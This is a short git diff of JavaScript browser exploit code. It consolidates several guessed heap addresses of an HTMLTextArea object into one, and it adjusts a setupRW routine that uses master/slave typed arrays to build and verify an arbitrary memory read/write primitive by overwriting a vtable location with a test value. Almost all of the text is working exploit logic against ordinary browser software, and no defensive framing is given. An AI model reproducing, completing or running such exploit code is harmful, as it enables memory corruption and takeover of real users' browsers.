@@ -42,9 +42,7 @@ var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
 var g_round = 1;
 var g_input = null;
 
-var guess_htmltextarea_addr2 = new Int64("0x20a505b48");
-var guess_htmltextarea_addr4 = new Int64("0x2076dfd80");
-var guess_htmltextarea_addr5 = new Int64("0x2076dfde0");
+var guess_htmltextarea_addr = new Int64("0x20a505b48");
 
 var master_b = new Uint32Array(2);
 var slave_b =  new Uint32Array(2);
@@ -101,9 +99,9 @@ function setupRW() {
 
 	debug_log("[+] Testing arbitrary R/W");
 
-	let saved_vtable = read64(guess_htmltextarea_addr2);
-	write64(guess_htmltextarea_addr4, new Int64("0x4141414141414141"));
-	if (!read64(guess_htmltextarea_addr5).equals("0x4141414141414141"))
+	let saved_vtable = read64(guess_htmltextarea_addr);
+	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
+	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
 	debug_log("[+] Succesfully got arbitrary R/W!");
